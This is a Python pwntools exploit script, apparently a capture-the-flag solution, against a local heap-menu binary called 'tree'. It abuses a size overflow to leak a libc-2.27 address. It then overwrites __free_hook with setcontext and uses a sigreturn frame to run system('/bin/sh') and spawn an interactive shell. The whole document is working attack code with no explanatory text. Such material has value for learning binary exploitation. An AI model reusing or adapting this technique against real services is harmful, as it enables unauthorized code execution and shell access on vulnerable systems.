from pwn import *

# s = process("./tree")
s = remote("127.0.0.1",55000)

def create(size,lis,idx):
    s.sendlineafter(">>","1")
    s.sendlineafter("idx?",str(idx))
    s.sendlineafter("how many?",str(size))
    for i in lis:
        s.sendlineafter("num?",str(i))

def add(idx,l,r,c):
    s.sendlineafter(">>","2")
    s.sendlineafter("idx?",str(idx))
    s.sendlineafter("l:",str(l))
    s.sendlineafter("r:",str(r))
    s.sendlineafter("c:",str(c))

def free(idx):
    s.sendlineafter(">>","3")
    s.sendlineafter("idx?",str(idx))

def show(idx,l,r):
    s.sendlineafter(">>","4")
    s.sendlineafter("idx?",str(idx))
    s.sendlineafter("l:",str(l))
    s.sendlineafter("r:",str(r))

create(1,[0],0)
create(40,[i for i in range(40)],1)
create(1,[u64("/bin/sh\x00")],2)
free(1)
create((0x10+(0x1fff<<32)),[],0)
show(0,1,1)
s.recvuntil("0 : ")
libc = ELF("./libc-2.27.so")
libc.address = int(s.recvline(keepends=False))-0x3ec210
success(hex(libc.address))

free_hook = libc.sym['__free_hook']
# gdb.attach(s,"b *$rebase(0xc27)\nc")

create(1,[u64("/bin/sh\x00")],4)
free(4)
show(0,11,12)
s.recvuntil("0 : ")
tmp = int(s.recvline(keepends=False))+0x2d0
success(hex(tmp))
add(0,1,1,free_hook-8-tmp)

create(1,[u64("/bin/sh\x00")],3)
# gdb.attach(s,"b *$rebase(0x8b7)\nc")
context.arch = 'amd64'
sig = SigreturnFrame()
sig.rdi = libc.address+0x1b3e1a
sig.rax = 59
sig.rsi = 0
sig.rdx = 0
sig.rsp = libc.bss()+0x508
sig.rbp = libc.bss()+0x1000
sig.rip = libc.sym['system']
# sig.csgsfs = 0x2b000000000033
# print(len(str(sig)))
lisx = []
sig = str(sig)[8:]
for i in range(0,len(sig),8):
    lisx.append(u64(sig[i:i+8]))
lisx = lisx
print(lisx)
# gdb.attach(s,"b free\nc")
add(3,1,1,libc.sym['setcontext']+53)
create(30,lisx,5)

# free(5)

s.interactive()